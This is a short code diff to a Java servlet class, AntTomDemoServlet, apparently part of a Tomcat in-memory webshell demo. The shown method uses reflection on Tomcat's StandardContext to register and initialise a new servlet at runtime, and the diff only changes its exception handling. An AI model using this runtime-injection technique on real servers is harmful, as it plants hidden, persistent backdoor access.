@@ -507,8 +507,7 @@ public class AntTomDemoServlet extends HttpServlet {
         return true;
     }
 
-    public void dynamicAddServlet(ServletContext servletContext) {
-        try {
+    public void dynamicAddServlet(ServletContext servletContext) throws Exception {
             String wrapperName = this.path;
 
             // get standardContext
@@ -542,10 +541,6 @@ public class AntTomDemoServlet extends HttpServlet {
             method.invoke(standardContext, path, wrapperName);
 
             this.init((ServletConfig) getFieldValue(newWrapper, "facade"));
-
-        } catch (Exception e) {
-            ;
-        }
     }
 
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
